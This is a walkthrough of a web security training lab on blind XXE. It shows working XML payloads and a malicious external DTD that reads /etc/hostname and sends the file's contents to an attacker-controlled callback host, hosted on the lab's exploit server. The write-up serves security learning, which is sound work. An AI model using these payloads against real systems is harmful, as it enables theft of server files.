# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

 This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the /etc/hostname file. 

**NOTE**

*To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.*

# Step 1 locate XXE in /product/stock page

Finding XML being passes to the backend

![image](https://user-images.githubusercontent.com/83407557/210391627-604e5672-88e8-415d-bca0-b474033c04de.png)

Using entity definition to get a callback

**Collaborator URL**
```html
pjcrki0vczpfctf4x2xuy1ntnktbh15q.oastify.com
```

**XXE payload**
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://pjcrki0vczpfctf4x2xuy1ntnktbh15q.oastify.com"> %xxe;]>
```

![image](https://user-images.githubusercontent.com/83407557/210392370-8f66709d-900c-4250-9731-b727c66d6b0d.png)

**Polling collaborator**

![image](https://user-images.githubusercontent.com/83407557/210392459-8acfe7db-ff34-4d7f-9708-9267d0e14f1c.png)

# Step 2 setting up attack server

In an actual test I would be setting up my own server to host the DTD file, however for this lab an attack server is provided:

![image](https://user-images.githubusercontent.com/83407557/210392708-ffeff47b-9f18-49e4-b1e1-d53c1b7e73c5.png)

![image](https://user-images.githubusercontent.com/83407557/210392837-19e7e507-44ae-42af-bf5a-b413fdc14837.png)

**DTD file**

I need this DTD to grab the target file (/etc/hostname) and exfil it to my collaborator (pjcrki0vczpfctf4x2xuy1ntnktbh15q.oastify.com)

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://pjcrki0vczpfctf4x2xuy1ntnktbh15q.oastify.com/?x=%file;'>">
%eval;
%exfil;
```

I then add this as the payload to the attack server's /exploit page:

![image](https://user-images.githubusercontent.com/83407557/210393470-9060001a-70b4-41b9-be1d-54fed03035ce.png)

# Step 3 perform XXE via hosted DTD

Attack server URL:

`https://exploit-0a3200140399df62c2654783010d002d.exploit-server.net/exploit`

XXE payload:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a3200140399df62c2654783010d002d.exploit-server.net/exploit"> %xxe;]>
```
![image](https://user-images.githubusercontent.com/83407557/210394351-f22b104e-ec6b-4367-bb84-78867997f6fd.png)

# Step 4 check logs, and poll collaborator:

Checking the attack server's access logs I see that a request for /exploit was made:

![image](https://user-images.githubusercontent.com/83407557/210394598-1e81ccef-8cd4-43f5-9e9b-b6b9b295ed69.png)

Polling my collaborator I see a request containing the hostname of the target:

![image](https://user-images.githubusercontent.com/83407557/210394861-508c0375-9416-486f-9a8c-b4d2f39bd0fb.png)

# Step 5 submit hostname:

![image](https://user-images.githubusercontent.com/83407557/210394969-7b06329b-c59e-457f-82f5-f65445ff917a.png)

which solves the lab:

![image](https://user-images.githubusercontent.com/83407557/210395013-4d10095f-c191-4830-a77a-eb28983e65d6.png)


